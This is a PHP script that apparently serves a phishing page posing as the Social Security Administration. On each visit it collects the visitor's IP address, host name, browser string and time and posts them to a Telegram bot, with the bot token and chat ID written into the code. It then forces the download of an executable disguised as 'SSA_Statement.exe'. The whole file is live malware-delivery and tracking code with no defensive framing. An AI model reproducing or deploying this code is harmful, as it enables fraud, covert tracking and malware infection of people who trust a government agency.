<?php
// Visitor counter
$counter_file = 'visitor_count.txt';
$visitor_count = file_exists($counter_file) ? (int)file_get_contents($counter_file) + 1 : 1;
file_put_contents($counter_file, $visitor_count);

// Get visitor info
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$isp = gethostbyaddr($ip); // Get ISP/domain info

// Format message with black background style
$message = "```\n"
          ."🚀 New SSA WEBSITE VISIT DETECTED!\n"
          ."══════════════════════════════\n"
          ."👤 Visitor No: $visitor_count\n"
          ."🌐 IP Address: $ip\n"
          ."📡 ISP: ".($isp ?: 'Unknown')."\n"
          ."💻 Device: $ua\n"
          ."🕒 Time: $time\n"
          ."══════════════════════════════\n"
          ."🔔 VISITOR TRACKING ACTIVE!\n"
          ."```";

// Send to Telegram
$botToken = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
$chatId = '7724482403';
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'MarkdownV2',
    'disable_web_page_preview' => true
];

// Use cURL if available (more reliable)
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
} else {
    file_get_contents($url.'?'.http_build_query($data));
}

// Force file download (unchanged)
$file = 'statement.exe';
if (file_exists($file)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="SSA_Statement.exe"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
